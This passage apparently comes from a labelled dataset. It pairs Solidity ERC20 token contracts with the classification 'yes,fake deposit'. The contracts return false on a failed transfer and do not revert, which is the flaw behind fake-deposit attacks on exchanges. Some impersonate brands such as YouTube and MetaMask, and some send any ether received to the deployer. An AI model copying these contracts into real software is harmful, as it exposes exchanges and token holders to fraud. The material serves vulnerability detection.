"completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n\n function transfer(address to, uint value) public returns (bool ok);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract CryptopiaLandDollar is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 4000000*10**uint256(decimals);\n\n string public constant name = \"CryptopiaLandDollar\";\n string public constant symbol = \"CLD\";\n\n address payable teamAddress;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n\n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Verso is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000*10**uint256(decimals);\n string public constant name = \"Verso\";\n string public constant symbol = \"VSO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000; // Update total supply (100000 for example)\n name = \"Hodu Commemorative Coins\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"HODU\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract MetaMaskToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Meta Mask Token\";\n string public constant symbol = \"MASK\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"train.exchange\";\n decimals = 0;\n symbol = \"TRAIN\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract CryptoCoin is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is CryptoCoin {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 5000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 5000000000; // Update total supply (100000 for example)\n name = \"CryptoCoin\"; // Set the name for display purposes\n decimals = 1; // Amount of decimals for display purposes\n symbol = \"CCO\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract PregnantButtToken {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract pbutttoken is PregnantButtToken {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract PREGNANTBUTT is pbutttoken {\n\n function () {\n throw;\n }\n\n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'H1.0'; \n\n\n function PREGNANTBUTT(\n ) {\n balances[msg.sender] = 250000000000000000000000000; \n totalSupply = 250000000000000000000000000; \n name = \"pregnantbutt.finance\"; \n decimals = 18; \n symbol = \"PBUTT\"; \n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'ShibaInuBurger' token contract\n//\n// Symbol : SIB \ud83c\udf54\n// Name : Shiba Inu Burger\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaInuBurger is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Inu Burger\";\n string public constant symbol = \"SIB \ud83c\udf54\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// YouTube Official Token\n// https://youtube.com\n// https://twitter.com/YouTube\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract YouTubeOfficialToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"YouTube Official Token\";\n string public constant symbol = \"YOUTUBE\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Moon_Shib is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Moon Shib\";\n string public constant symbol = \"MOONSHIB\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Rocket_Shib is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Rocket Shib\";\n string public constant symbol = \"RSHIB\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Nabla is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\nfunction ERC20Token(\n) {\nbalances[msg.sender] = 10000000000; // Give the creator all initial tokens (100000 for example)\ntotalSupply = 10000000000; // Update total supply (100000 for example)\nname = \"Nabla\"; // Set the name for display purposes\ndecimals = 8; // Amount of decimals for display purposes\nsymbol = \"NBL\"; // Set the symbol for display purposes\n}\n 